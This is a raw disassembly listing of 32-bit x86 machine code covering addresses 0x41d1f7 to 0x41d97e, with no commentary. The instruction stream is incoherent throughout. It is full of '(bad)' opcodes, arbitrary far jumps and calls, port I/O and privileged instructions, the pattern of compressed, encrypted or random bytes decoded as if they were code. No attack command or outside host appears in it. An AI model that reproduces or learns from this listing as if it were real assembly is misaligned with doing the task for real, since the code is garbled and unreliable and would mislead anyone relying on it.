  41d1f7:	lea    esp,[edx]
  41d1f9:	push   esp
  41d1fa:	add    al,0xa5
  41d1fc:	jmp    0xdc77:0x4674891d
  41d203:	mov    gs,WORD PTR [esi-0x30]
  41d206:	and    dh,BYTE PTR [eax+0x27aea872]
  41d20c:	rcl    BYTE PTR [edi+0x42],0xb9
  41d210:	push   ds
  41d211:	mov    al,0xba
  41d213:	jbe    0x41d199
  41d215:	test   BYTE PTR [eax+0x34],ch
  41d218:	fmulp  st(1),st
  41d21a:	repz pop ecx
  41d21c:	add    ch,BYTE PTR [edx-0x53]
  41d21f:	call   0x97c2:0x128650ac
  41d226:	dec    edx
  41d227:	ret    
  41d228:	test   al,0x5e
  41d22a:	enter  0x5e8a,0xc7
  41d22e:	neg    DWORD PTR [edi-0x79]
  41d231:	sar    edx,1
  41d233:	mov    dh,0xdf
  41d235:	imul   esi,ebx,0xe05da591
  41d23b:	cmp    BYTE PTR [edx+esi*4+0x44],bh
  41d23f:	add    eax,0x9001d8b3
  41d244:	xbegin 0x14c9c2af
  41d24a:	cs lahf 
  41d24c:	fs retf 
  41d24e:	and    eax,0x935f81de
  41d253:	xchg   esi,eax
  41d254:	xchg   ecx,eax
  41d255:	and    al,cl
  41d257:	pop    ebx
  41d258:	ret    
  41d259:	or     DWORD PTR [edi],0x1b2965ee
  41d25f:	arpl   WORD PTR [edx+0x9be60ff],cx
  41d265:	sbb    ch,BYTE PTR [eax]
  41d267:	or     eax,0xeddd9959
  41d26c:	inc    edx
  41d26d:	dec    esi
  41d26e:	pop    eax
  41d26f:	push   esi
  41d271:	(bad)  [esi+0x51]
  41d274:	jmp    0x41d262
  41d276:	(bad)  
  41d277:	cmc    
  41d278:	sbb    DWORD PTR es:[ebx-0x687f3d8f],esp
  41d27f:	sbb    edi,DWORD PTR [ebx+esi*4+0x58]
  41d283:	and    dl,cl
  41d285:	ins    BYTE PTR es:[edi],dx
  41d286:	inc    edi
  41d287:	mov    bh,BYTE PTR [eax+0x1e]
  41d28a:	fld    DWORD PTR [ebx]
  41d28c:	sub    BYTE PTR [eax],bl
  41d28e:	fsubp  st(6),st
  41d290:	cmp    DWORD PTR [ebp+0x5f],0x53b34412
  41d297:	ss out 0x7b,al
  41d29a:	cs sbb eax,0xd954728
  41d2a0:	ficomp DWORD PTR [edi]
  41d2a2:	fist   DWORD PTR [edi+0x7f531890]
  41d2a8:	inc    ecx
  41d2a9:	or     dh,BYTE PTR [edi-0x1d7e55ba]
  41d2af:	fiadd  DWORD PTR es:[edx-0x569e3530]
  41d2b6:	xor    edi,DWORD PTR [ecx]
  41d2b8:	cmp    BYTE PTR [eax-0x6f],dl
  41d2bb:	clc    
  41d2bc:	inc    edx
  41d2bd:	idiv   DWORD PTR [ebx+0x12]
  41d2c0:	das    
  41d2c1:	xchg   esi,eax
  41d2c2:	in     al,dx
  41d2c3:	cdq    
  41d2c4:	rol    ebp,cl
  41d2c6:	dec    eax
  41d2c7:	out    0x0,eax
  41d2c9:	in     eax,dx
  41d2ca:	inc    edx
  41d2cb:	adc    edx,DWORD PTR [ecx-0x1e]
  41d2ce:	pop    esi
  41d2cf:	cmc    
  41d2d0:	sbb    esi,0x67f7d0f4
  41d2d6:	sub    eax,DWORD PTR [edi-0x6951c2fb]
  41d2dc:	aaa    
  41d2dd:	mov    eax,ds:0xf10f8b51
  41d2e2:	aaa    
  41d2e3:	and    DWORD PTR [eax+edi*2+0x3e01ff13],eax
  41d2ea:	and    BYTE PTR [esp+edi*4+0x3c],al
  41d2ee:	cmp    ebp,DWORD PTR [edx-0x71936d46]
  41d2f4:	mov    dl,0x57
  41d2f6:	ins    BYTE PTR es:[edi],dx
  41d2f7:	ins    BYTE PTR es:[edi],dx
  41d2f8:	cmp    eax,0xc52f656d
  41d2fd:	call   0x4b72:0x9cb0334
  41d304:	push   ss
  41d305:	push   edi
  41d306:	cmp    ecx,esi
  41d308:	popf   
  41d309:	push   ss
  41d30a:	dec    edi
  41d30b:	push   edi
  41d30c:	(bad)
  41d30f:	fmul   DWORD PTR [esi-0x325b0c32]
  41d315:	cmp    DWORD PTR [ebx],edi
  41d317:	or     ebx,DWORD PTR [ecx-0x80]
  41d31a:	outs   dx,DWORD PTR ds:[esi]
  41d31b:	xchg   ebx,eax
  41d31c:	lahf   
  41d31d:	mov    esp,0x668971ba
  41d322:	sbb    DWORD PTR [esi+0x6fb0284e],ebx
  41d328:	xlat   BYTE PTR ds:[ebx]
  41d329:	in     al,dx
  41d32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d32b:	mov    ds:0xd3c393ad,al
  41d330:	dec    esi
  41d331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d332:	gs mov esp,0x2f14f745
  41d338:	or     al,0xde
  41d33a:	mov    edx,0xe9f41552
  41d33f:	mov    ds:0x1e30fb4a,eax
  41d344:	(bad)  
  41d345:	rol    DWORD PTR ds:0x3cd7091d,1
  41d34b:	mov    al,BYTE PTR [bx+si+0x21a0]
  41d350:	push   cs
  41d351:	dec    ecx
  41d352:	mov    esi,eax
  41d354:	in     al,0x2b
  41d356:	addr16 mov ah,0xdf
  41d359:	loope  0x41d2fc
  41d35b:	inc    esi
  41d35c:	rol    dh,cl
  41d35e:	sbb    cl,BYTE PTR ds:0xfa08a506
  41d364:	js     0x41d2ec
  41d366:	jmp    0xa294:0xc9dbb349
  41d36d:	in     al,dx
  41d36e:	pop    edi
  41d36f:	dec    esi
  41d370:	jbe    0x41d371
  41d372:	mov    esi,0x232d7678
  41d377:	std    
  41d378:	and    ch,BYTE PTR [ebp+0x7e5a889a]
  41d37e:	mov    BYTE PTR [edx],0x7c
  41d381:	jecxz  0x41d337
  41d383:	daa    
  41d384:	xor    dl,ah
  41d386:	icebp  
  41d387:	xchg   esp,eax
  41d388:	sub    ah,BYTE PTR [ebp-0x24]
  41d38b:	add    BYTE PTR [edx+ecx*4-0x16],ch
  41d38f:	jmp    0x41d351
  41d391:	xor    BYTE PTR [edx],0x98
  41d394:	das    
  41d395:	push   ss
  41d396:	dec    ebp
  41d397:	call   0x9a49:0xbb37e6c2
  41d39e:	xchg   ecx,eax
  41d39f:	jne    0x41d3d1
  41d3a1:	loop   0x41d34b
  41d3a3:	mov    edi,0xef4f382e
  41d3a8:	pop    ds
  41d3a9:	xor    DWORD PTR [edx+0x45],edi
  41d3ac:	sub    al,0x3
  41d3ae:	xor    DWORD PTR [eax+0x44],eax
  41d3b1:	jo     0x41d40c
  41d3b3:	test   eax,0xaec4fbec
  41d3b8:	adc    ebp,edi
  41d3ba:	test   eax,0x6908d287
  41d3bf:	mov    esp,0xb21996db
  41d3c4:	or     eax,eax
  41d3c6:	aas    
  41d3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c8:	ret    
  41d3c9:	not    BYTE PTR [ecx-0x59]
  41d3cc:	push   ss
  41d3cd:	adc    esp,DWORD PTR [edx+0x73e1133]
  41d3d3:	scas   al,BYTE PTR es:[edi]
  41d3d4:	and    al,BYTE PTR [esi]
  41d3d6:	inc    edi
  41d3d7:	or     eax,0xa1605b09
  41d3dc:	ret    
  41d3dd:	sti    
  41d3de:	push   ebp
  41d3df:	pop    ds
  41d3e0:	(bad)  
  41d3e1:	stc    
  41d3e2:	mov    edx,0xf45f3a7b
  41d3e7:	cmp    BYTE PTR [eax],al
  41d3e9:	push   ecx
  41d3ea:	and    ebp,esi
  41d3ec:	(bad)  
  41d3ed:	cmp    esp,DWORD PTR [edi*1+0x4f294699]
  41d3f4:	mov    eax,0x3bdd032b
  41d3f9:	bound  eax,QWORD PTR [ebx]
  41d3fb:	hlt    
  41d3fc:	outs   dx,DWORD PTR ds:[esi]
  41d3fd:	mov    esp,0x3e1e7b37
  41d402:	mov    DWORD PTR [edx-0x2f93c75f],ebp
  41d408:	das    
  41d409:	daa    
  41d40a:	aas    
  41d40b:	dec    edi
  41d40c:	(bad)  
  41d40d:	jae    0x41d413
  41d40f:	mov    eax,ds:0x68f16b6a
  41d414:	xor    ch,al
  41d416:	out    0x35,al
  41d418:	push   ds
  41d419:	sbb    al,bh
  41d41b:	pop    eax
  41d41c:	push   es
  41d41d:	xlat   BYTE PTR ds:[ebx]
  41d41e:	push   eax
  41d41f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d420:	leave  
  41d421:	or     BYTE PTR [eax],ch
  41d423:	cmp    BYTE PTR [esi+0x62],bl
  41d426:	jmp    0x41d403
  41d428:	adc    DWORD PTR [ebp-0x76],0xf30bb02c
  41d42f:	cmp    dh,BYTE PTR es:[edx-0x74]
  41d433:	ja     0x41d428
  41d435:	data16 ds test al,0xa
  41d439:	out    0x23,eax
  41d43b:	out    0x25,al
  41d43d:	outs   dx,BYTE PTR ds:[esi]
  41d43e:	imul   ebp,DWORD PTR [ecx],0xa61c50fb
  41d444:	lock and DWORD PTR [edx],esi
  41d447:	add    DWORD PTR [edx],ecx
  41d449:	addr16 cs or ebp,esp
  41d44d:	out    0x3e,al
  41d44f:	mul    DWORD PTR [ecx+0x50]
  41d452:	scas   al,BYTE PTR es:[edi]
  41d453:	mov    ds:0xc9e75fec,al
  41d458:	push   edi
  41d459:	cmp    ah,ch
  41d45b:	mov    ds:0x4f884b55,al
  41d460:	hlt    
  41d461:	fsubr  QWORD PTR [esi+0x5987d971]
  41d467:	loop   0x41d4e3
  41d469:	ja     0x41d445
  41d46b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d46c:	xor    BYTE PTR [ebp+0x72],0xa3
  41d470:	add    bh,BYTE PTR [esi-0x24285193]
  41d476:	fmul   QWORD PTR ds:0x4a840d8c
  41d47c:	repnz (bad) [ecx]
  41d47f:	push   ss
  41d480:	dec    esp
  41d481:	mov    eax,ds:0xfc293dcc
  41d486:	stos   DWORD PTR es:[edi],eax
  41d487:	ss (bad) 
  41d489:	fnsave [esi]
  41d48b:	add    al,dh
  41d48d:	sti    
  41d48e:	and    BYTE PTR [edi-0x53],dh
  41d491:	sbb    eax,0x624907f9
  41d496:	in     al,0x35
  41d498:	js     0x41d4d0
  41d49a:	test   eax,0xda95e5ce
  41d49f:	jne    0x41d4aa
  41d4a1:	mov    ds:0x9d63a6fa,eax
  41d4a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4a7:	and    bl,dl
  41d4a9:	push   esp
  41d4aa:	cmp    edi,DWORD PTR ds:0x65428e1d
  41d4b0:	gs xor ah,0x6d
  41d4b4:	popa   
  41d4b5:	xor    eax,0xb8e3f9fd
  41d4ba:	mov    ebp,0xd56e419d
  41d4bf:	scas   al,BYTE PTR es:[edi]
  41d4c0:	ret    
  41d4c1:	out    0x83,al
  41d4c3:	jno    0x41d4ee
  41d4c5:	leave  
  41d4c6:	retf   0x9918
  41d4c9:	aam    0x9c
  41d4cb:	test   DWORD PTR [esi],ebx
  41d4cd:	add    eax,0xc272d03d
  41d4d2:	outs   dx,DWORD PTR ds:[esi]
  41d4d3:	repnz or ecx,DWORD PTR ds:[ebx+0x31fd7b16]
  41d4db:	push   ds
  41d4dc:	xchg   ebp,eax
  41d4dd:	inc    esi
  41d4de:	jne    0x41d496
  41d4e0:	retf   0x1061
  41d4e3:	shr    DWORD PTR [ecx-0x57],0xc7
  41d4e7:	inc    esi
  41d4e8:	sar    esp,cl
  41d4ea:	imul   eax,edi,0x27
  41d4ed:	and    eax,0x439fdfc5
  41d4f2:	fist   DWORD PTR [ebp+0xce17f16]
  41d4f8:	mov    esi,edx
  41d4fa:	sub    eax,0x4ac2aaa9
  41d4ff:	and    al,0xab
  41d501:	mov    ?,WORD PTR [edx]
  41d503:	xchg   edi,eax
  41d504:	adc    bl,BYTE PTR [edi+0x2a]
  41d507:	iret   
  41d508:	test   al,0x77
  41d50a:	mov    ebp,0xaee84b28
  41d50f:	daa    
  41d510:	inc    esi
  41d511:	jbe    0x41d54c
  41d513:	iret   
  41d514:	or     ch,BYTE PTR [esi+0x5c]
  41d517:	fwait
  41d518:	adc    DWORD PTR [esi-0x3e114e75],0x2dd0f63b
  41d522:	fst    DWORD PTR [edi-0x55552a7c]
  41d528:	and    dh,BYTE PTR [edi+eiz*1-0x43]
  41d52c:	lods   al,BYTE PTR ds:[esi]
  41d52d:	pop    es
  41d52e:	mov    gs,WORD PTR [ecx]
  41d530:	fldcw  WORD PTR [ecx-0x3ec69a30]
  41d536:	pop    ds
  41d537:	cmp    ebp,DWORD PTR [ecx-0x56]
  41d53a:	dec    esp
  41d53b:	dec    edx
  41d53c:	jnp    0x41d4f3
  41d53e:	sub    esi,esp
  41d540:	in     eax,dx
  41d541:	pushf  
  41d542:	xlat   BYTE PTR ds:[ebx]
  41d543:	ss mov al,0x71
  41d546:	mov    ah,0xaf
  41d548:	cwde   
  41d549:	call   0x67df1206
  41d54e:	jb     0x41d581
  41d550:	cmp    dh,ch
  41d552:	add    DWORD PTR cs:[edi-0x68],ecx
  41d556:	cmp    ebp,eax
  41d558:	loope  0x41d55c
  41d55a:	cs and eax,0x6338af9b
  41d560:	int    0xae
  41d562:	mov    esi,edx
  41d564:	cli    
  41d565:	jle    0x41d4fb
  41d567:	fdivrp st(4),st
  41d569:	fwait
  41d56a:	out    dx,al
  41d56b:	hlt    
  41d56c:	pop    esi
  41d56d:	pushf  
  41d56e:	sub    esi,ecx
  41d570:	imul   ebx,DWORD PTR [edi],0x3e9a997f
  41d576:	stos   BYTE PTR es:[edi],al
  41d577:	jno    0x41d5cd
  41d579:	cmp    BYTE PTR [eax+0x21],dh
  41d57c:	mov    dl,0x5d
  41d57e:	clc    
  41d57f:	stos   BYTE PTR es:[edi],al
  41d580:	lods   eax,DWORD PTR ds:[esi]
  41d581:	jp     0x41d552
  41d583:	jp     0x41d5a7
  41d585:	retf   0xeb44
  41d588:	in     eax,0x18
  41d58a:	ror    DWORD PTR [edx],0xa3
  41d58d:	or     eax,0x327982fe
  41d592:	test   BYTE PTR ss:[edx-0x2f055b5c],ah
  41d599:	ins    DWORD PTR es:[edi],dx
  41d59a:	adc    ch,bh
  41d59c:	mov    esi,0x1040c290
  41d5a1:	inc    edi
  41d5a2:	out    0xe4,al
  41d5a4:	pop    eax
  41d5a5:	sbb    BYTE PTR [edi-0x2ae2d442],dh
  41d5ab:	repz or dh,BYTE PTR [ebx]
  41d5ae:	lock adc eax,0xe6427f1
  41d5b4:	out    dx,al
  41d5b5:	fisttp DWORD PTR [ebp+0x3fabe150]
  41d5bb:	adc    al,0xd4
  41d5bd:	daa    
  41d5be:	jge    0x41d5a3
  41d5c0:	or     edx,DWORD PTR [edx]
  41d5c2:	jo     0x41d617
  41d5c4:	xchg   ecx,eax
  41d5c5:	jmp    0x415a:0x499d283
  41d5cc:	xlat   BYTE PTR ds:[ebx]
  41d5cd:	mov    al,BYTE PTR [edi-0x75ff6dcb]
  41d5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5d4:	push   ebp
  41d5d5:	sub    esi,DWORD PTR [ebx]
  41d5d7:	jl     0x41d576
  41d5d9:	cmp    dh,ch
  41d5db:	ss hlt 
  41d5dd:	jl     0x41d5d4
  41d5df:	xor    bh,BYTE PTR [ebp+0x15]
  41d5e2:	sti    
  41d5e3:	imul   edx,esi,0x58
  41d5e6:	sar    DWORD PTR [edx+0x3cb51e3b],1
  41d5ec:	dec    ebp
  41d5ed:	(bad)  
  41d5ee:	add    eax,DWORD PTR [ebx+0x41]
  41d5f1:	mov    dl,0x2
  41d5f3:	mov    cl,BYTE PTR [edi+0x3887eb6a]
  41d5f9:	push   0x6aa44ad9
  41d5fe:	or     al,0x95
  41d600:	(bad)  
  41d601:	lahf   
  41d602:	add    DWORD PTR [eax-0x41f2c3b6],eax
  41d608:	imul   DWORD PTR [ebx-0x3a]
  41d60b:	aad    0xed
  41d60d:	shr    DWORD PTR [eax+0x7138431f],1
  41d613:	push   eax
  41d614:	jns    0x41d64f
  41d616:	add    al,0x32
  41d618:	test   bh,bh
  41d61a:	sub    esp,DWORD PTR [ebx]
  41d61c:	fwait
  41d61d:	neg    ebx
  41d61f:	jbe    0x41d677
  41d621:	out    dx,eax
  41d622:	lods   al,BYTE PTR ds:[esi]
  41d623:	sbb    ecx,DWORD PTR [ebx]
  41d625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d626:	fs ins BYTE PTR es:[edi],dx
  41d628:	mov    dh,0xbe
  41d62a:	inc    edi
  41d62b:	ja     0x41d653
  41d62d:	ja     0x41d5e5
  41d62f:	push   eax
  41d630:	ror    DWORD PTR [ebx-0x59c001e5],cl
  41d636:	(bad)  
  41d637:	(bad)  
  41d638:	scas   al,BYTE PTR es:[edi]
  41d639:	loope  0x41d649
  41d63b:	out    0x60,eax
  41d63d:	lock pusha 
  41d63f:	pop    es
  41d640:	popf   
  41d641:	or     eax,0xb676b47f
  41d646:	inc    esp
  41d647:	aas    
  41d648:	call   0x6e37:0x4ab4e59a
  41d64f:	mov    cl,0x14
  41d651:	(bad)  
  41d652:	aad    0xca
  41d654:	push   esi
  41d655:	call   0x2074b548
  41d65a:	aam    0xad
  41d65c:	daa    
  41d65d:	popa   
  41d65e:	xchg   edx,eax
  41d65f:	push   0xf102b5d9
  41d664:	and    eax,0xedbc87eb
  41d669:	(bad)  
  41d66a:	pop    ecx
  41d66b:	lods   eax,DWORD PTR ds:[esi]
  41d66c:	mov    edx,0xa1427fd9
  41d671:	pop    ebp
  41d672:	iret   
  41d673:	push   0x5c
  41d675:	xchg   edi,eax
  41d676:	mov    ebp,esp
  41d678:	mov    bh,0xb7
  41d67a:	pop    es
  41d67b:	adc    edx,edi
  41d67d:	aad    0x9a
  41d67f:	and    al,0x41
  41d681:	ficom  WORD PTR [eax-0x58]
  41d684:	repz inc ebx
  41d686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d687:	push   0xffffff8a
  41d689:	mov    ch,0xbc
  41d68b:	pop    edi
  41d68c:	ss mov ah,0x95
  41d68f:	cmp    al,0xe1
  41d691:	sub    edx,esp
  41d693:	inc    edx
  41d694:	aam    0xb2
  41d696:	mov    ds:0x3d554ff4,al
  41d69b:	cmp    eax,0x6b9767a5
  41d6a0:	push   0xbdaa70f5
  41d6a5:	mov    dh,0xd2
  41d6a7:	js     0x41d677
  41d6a9:	fimul  DWORD PTR [edi]
  41d6ab:	xor    DWORD PTR [edi],ebp
  41d6ad:	push   es
  41d6ae:	jnp    0x41d676
  41d6b0:	nop
  41d6b1:	or     eax,0x34473dfb
  41d6b6:	xor    DWORD PTR [ebx-0x71],ebx
  41d6b9:	xchg   ebp,eax
  41d6ba:	dec    DWORD PTR [edi]
  41d6bc:	pop    ds
  41d6bd:	(bad)  
  41d6be:	ins    DWORD PTR es:[edi],dx
  41d6bf:	pop    ebp
  41d6c0:	mov    ds:0x8b2e8efb,al
  41d6c5:	shr    DWORD PTR [ebp-0x7d],0x82
  41d6c9:	pop    esp
  41d6ca:	cmp    eax,0x96c08516
  41d6cf:	cmc    
  41d6d0:	mov    esp,0x27658668
  41d6d5:	push   edx
  41d6d6:	arpl   WORD PTR [ecx+0x35],cx
  41d6d9:	ja     0x41d757
  41d6db:	fs cmp edx,DWORD PTR fs:[ecx]
  41d6df:	mov    esp,0x7871e91d
  41d6e4:	dec    ebx
  41d6e5:	loope  0x41d69f
  41d6e7:	jnp    0x41d69e
  41d6e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6ea:	popa   
  41d6eb:	xor    DWORD PTR [ebx],edi
  41d6ed:	dec    DWORD PTR [edi+0x47]
  41d6f0:	dec    ebp
  41d6f1:	jg     0x41d745
  41d6f3:	call   0x9a56e8b0
  41d6f8:	jle    0x41d67b
  41d6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6fb:	test   eax,0x165c7b61
  41d700:	clc    
  41d701:	xor    eax,0x44de8ffa
  41d706:	xor    al,0xa3
  41d708:	sub    cl,dh
  41d70a:	and    al,0xd6
  41d70c:	xchg   DWORD PTR [ebp-0x5b],ebp
  41d70f:	push   edi
  41d710:	or     bh,BYTE PTR [esi]
  41d712:	nop
  41d713:	nop
  41d714:	mov    ds:0x85e413f4,al
  41d719:	jmp    0x41d746
  41d71b:	paddusw mm3,QWORD PTR [esi+0x24653686]
  41d722:	ret    
  41d723:	mov    edx,0xa7a01ec4
  41d728:	pop    ds
  41d729:	cmc    
  41d72a:	out    dx,al
  41d72b:	dec    edx
  41d72c:	jno    0x41d6b8
  41d72e:	sbb    eax,0xcbc4fc6c
  41d733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d734:	xchg   ebp,eax
  41d735:	or     edx,DWORD PTR [esi+eiz*1]
  41d738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d739:	dec    esi
  41d73a:	shr    al,1
  41d73c:	sub    BYTE PTR ds:0x4476130d,dh
  41d742:	sub    eax,0xdc428a48
  41d747:	push   es
  41d748:	mov    DWORD PTR [edx],edx
  41d74a:	xlat   BYTE PTR ds:[ebx]
  41d74b:	jecxz  0x41d6ed
  41d74d:	inc    ebp
  41d74e:	fwait
  41d74f:	pushf  
  41d750:	jecxz  0x41d791
  41d752:	cmp    ah,BYTE PTR [eax+0x1a]
  41d755:	aaa    
  41d756:	scas   eax,DWORD PTR es:[edi]
  41d757:	adc    al,0x93
  41d759:	sub    eax,0xeaf105c0
  41d75e:	test   al,0xb6
  41d760:	or     eax,0xf20c89ec
  41d765:	push   es
  41d766:	icebp  
  41d767:	cdq    
  41d768:	pop    edx
  41d769:	jge    0x41d6f3
  41d76b:	xor    al,0x13
  41d76d:	outs   dx,DWORD PTR ds:[esi]
  41d76e:	lods   eax,DWORD PTR ds:[esi]
  41d76f:	sar    BYTE PTR [esi+0x70],cl
  41d772:	aam    0xef
  41d774:	mov    edx,0xdb8732fe
  41d779:	les    ebp,FWORD PTR [ebx+0x46]
  41d77c:	mov    dh,0x4
  41d77e:	aam    0xf4
  41d780:	xchg   esi,eax
  41d781:	mov    eax,ds:0x81e6c0bb
  41d786:	xlat   BYTE PTR ds:[ebx]
  41d787:	(bad)  
  41d788:	bound  edi,QWORD PTR [ebp-0x1ddf53f7]
  41d78e:	mov    ch,0x4c
  41d790:	mov    cl,0x6f
  41d792:	aaa    
  41d793:	rol    DWORD PTR [eax+edi*8],1
  41d796:	add    al,0x42
  41d798:	mov    WORD PTR [edx+edi*4-0xe],fs
  41d79c:	ud1    edi,DWORD PTR [ebp+0x5cef495f]
  41d7a3:	sub    BYTE PTR [edi+0x2c],bl
  41d7a6:	push   edi
  41d7a7:	mov    ds:0xfe4b208d,al
  41d7ac:	out    dx,al
  41d7ad:	dec    eax
  41d7ae:	iret   
  41d7af:	gs ss push es
  41d7b2:	es ret 
  41d7b4:	jae    0x41d763
  41d7b6:	add    dh,BYTE PTR [ecx-0x43]
  41d7b9:	test   al,0x19
  41d7bb:	inc    eax
  41d7bc:	scas   eax,DWORD PTR es:[edi]
  41d7bd:	mov    esi,DWORD PTR [eax]
  41d7bf:	sub    eax,0xbbb5d0f8
  41d7c4:	ins    DWORD PTR es:[edi],dx
  41d7c5:	add    BYTE PTR [ebp-0x196f0ef1],0xc4
  41d7cc:	les    ebx,FWORD PTR [ecx-0x3c]
  41d7cf:	adc    eax,0xa42296f6
  41d7d4:	test   al,0x1f
  41d7d6:	jo     0x41d7b9
  41d7d8:	adc    al,0xb6
  41d7da:	mov    ecx,0x832d99d1
  41d7df:	and    DWORD PTR [ebx-0x43],esp
  41d7e2:	inc    edi
  41d7e3:	push   es
  41d7e4:	xchg   ecx,eax
  41d7e5:	in     eax,0x76
  41d7e7:	mov    ds:0xe9ea44a7,al
  41d7ec:	cwde   
  41d7ed:	xchg   edi,eax
  41d7ee:	cli    
  41d7ef:	mov    ecx,DWORD PTR [ebx+edx*4]
  41d7f2:	in     eax,0xb1
  41d7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7f5:	outs   dx,DWORD PTR ds:[esi]
  41d7f6:	mov    bl,0x84
  41d7f8:	push   edi
  41d7f9:	les    ebp,FWORD PTR [edx+0x33]
  41d7fc:	and    eax,0x94da4a4a
  41d801:	dec    esp
  41d802:	into   
  41d803:	or     eax,0xa36a8a53
  41d808:	jne    0x41d87a
  41d80a:	or     ecx,DWORD PTR [ecx]
  41d80c:	fdiv   QWORD PTR [edi-0x531a2ff1]
  41d812:	sti    
  41d813:	in     al,dx
  41d814:	loope  0x41d809
  41d816:	popa   
  41d817:	jmp    0x41d7af
  41d819:	mov    ebp,0x5e3d20ef
  41d81e:	arpl   WORD PTR [ebx],di
  41d820:	jl     0x41d857
  41d822:	xchg   esi,eax
  41d823:	shl    DWORD PTR [eax],0xff
  41d826:	jl     0x41d87a
  41d828:	cmp    eax,edi
  41d82a:	inc    esi
  41d82b:	or     eax,0xbed48145
  41d830:	add    al,0x42
  41d832:	mov    DWORD PTR [ebx+0x2a],esi
  41d835:	push   ecx
  41d836:	mov    cl,0x7a
  41d838:	in     eax,dx
  41d839:	lods   al,BYTE PTR ds:[esi]
  41d83a:	pop    ebp
  41d83b:	xor    DWORD PTR [ebp-0x1d9c79aa],0x4d76bd73
  41d845:	mov    ch,0xf8
  41d847:	jmp    0x41d7df
  41d849:	loope  0x41d8c6
  41d84b:	(bad)  
  41d84c:	xchg   edi,eax
  41d84d:	mov    ebx,DWORD PTR [eax+0x65]
  41d850:	jp     0x41d86d
  41d852:	or     eax,0x8e72018e
  41d857:	mov    ds:0x7755ece2,al
  41d85c:	ret    0x847e
  41d85f:	scas   al,BYTE PTR es:[edi]
  41d860:	dec    esp
  41d861:	dec    ebx
  41d862:	jg     0x41d873
  41d864:	repnz mov BYTE PTR [edx+ecx*8-0x1fcd9d3f],bh
  41d86c:	call   DWORD PTR [edi+0x454b78e4]
  41d872:	out    0xe2,al
  41d874:	xor    BYTE PTR [edi+0x2269ebb6],0xa7
  41d87b:	ja     0x41d84e
  41d87d:	xchg   ecx,eax
  41d87e:	push   esp
  41d87f:	repz out 0xb0,al
  41d882:	fst    QWORD PTR [esi]
  41d884:	addr16 xor dl,bh
  41d887:	xor    DWORD PTR [edi],eax
  41d889:	cmp    ebp,edx
  41d88b:	mov    cs,eax
  41d88d:	ror    BYTE PTR [ecx+0x65915b3e],0xd8
  41d894:	or     ebp,ebp
  41d896:	xor    ecx,DWORD PTR [edx-0x6d]
  41d899:	adc    BYTE PTR [edi+esi*8+0x13],dh
  41d89d:	cmp    al,0xd4
  41d89f:	out    0x40,eax
  41d8a1:	push   0x4d
  41d8a3:	stc    
  41d8a4:	in     al,0x8
  41d8a6:	test   DWORD PTR [ebx+0x27],0xc9c6ba17
  41d8ad:	lock jo 0x41d8d9
  41d8b0:	pop    edi
  41d8b1:	xchg   ebx,eax
  41d8b2:	int3   
  41d8b3:	mov    ah,0x46
  41d8b5:	shl    BYTE PTR [edx-0x847a603],1
  41d8bb:	adc    BYTE PTR [ebp+0x11f99f3c],al
  41d8c1:	loope  0x41d903
  41d8c3:	mov    ds:0x59bc662f,al
  41d8c8:	mov    ebp,0xb7907613
  41d8cd:	jg     0x41d861
  41d8cf:	(bad)
  41d8d2:	sub    al,0x33
  41d8d4:	inc    ebp
  41d8d5:	cwde   
  41d8d6:	jo     0x41d926
  41d8d8:	(bad)  
  41d8d9:	fldcw  WORD PTR [ebx-0x10]
  41d8dc:	leave  
  41d8dd:	xchg   esp,eax
  41d8de:	or     edx,eax
  41d8e0:	bound  esp,QWORD PTR [edi]
  41d8e2:	xchg   ebx,eax
  41d8e3:	mov    al,ds:0x4a187340
  41d8e8:	mov    ds:0xb81fbe33,al
  41d8ed:	push   ebx
  41d8ee:	jmp    0xcf3d:0xa11d8ed1
  41d8f5:	mov    eax,ds:0xb6d76f57
  41d8fa:	fisub  DWORD PTR [edx+ecx*1-0x544288a0]
  41d901:	mov    ebp,0x917c34d2
  41d906:	retf   0x19d4
  41d909:	adc    DWORD PTR [ecx+ebp*1-0x198e877d],ecx
  41d910:	add    DWORD PTR [esi-0xd366162],esi
  41d916:	lea    ebx,[eax+0x11]
  41d919:	dec    esi
  41d91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d91b:	call   0xca1b:0x8d0caa64
  41d922:	xor    ebx,DWORD PTR [ebx-0x6d]
  41d925:	add    DWORD PTR [ebx-0x6],esi
  41d928:	sub    ebp,DWORD PTR ds:0x2d79bcf4
  41d92e:	jge    0x41d8cd
  41d930:	mov    ah,0x1a
  41d932:	je     0x41d99d
  41d934:	xchg   edx,eax
  41d935:	jae    0x41d966
  41d937:	sbb    eax,DWORD PTR [ecx+eiz*4+0x6a]
  41d93b:	push   ss
  41d93c:	xor    DWORD PTR [eax],0x48
  41d93f:	xchg   edi,eax
  41d940:	dec    ebx
  41d941:	jl     0x41d99b
  41d943:	pop    esi
  41d944:	(bad)  ds:0x40ab7001
  41d94a:	shr    BYTE PTR [eax-0x43a25daf],1
  41d950:	pop    esi
  41d951:	mov    ds:0x3d4e2ae4,eax
  41d956:	ficomp WORD PTR [ecx+edx*4-0x4b]
  41d95a:	jp     0x41d90c
  41d95c:	dec    esi
  41d95d:	pop    ss
  41d95e:	add    al,0x85
  41d960:	jne    0x41d967
  41d962:	push   0x9241cd14
  41d967:	shr    BYTE PTR [ebx-0x10],cl
  41d96a:	daa    
  41d96b:	cmp    ah,BYTE PTR [ebp-0x48]
  41d96e:	xchg   edx,eax
  41d96f:	fwait
  41d970:	gs dec edx
  41d972:	sbb    eax,0x42c15c2e
  41d977:	add    ah,ch
  41d979:	je     0x41d9fa
  41d97b:	xor    DWORD PTR [ecx],ebp
  41d97d:	inc    ebp
  41d97e:	push   ecx
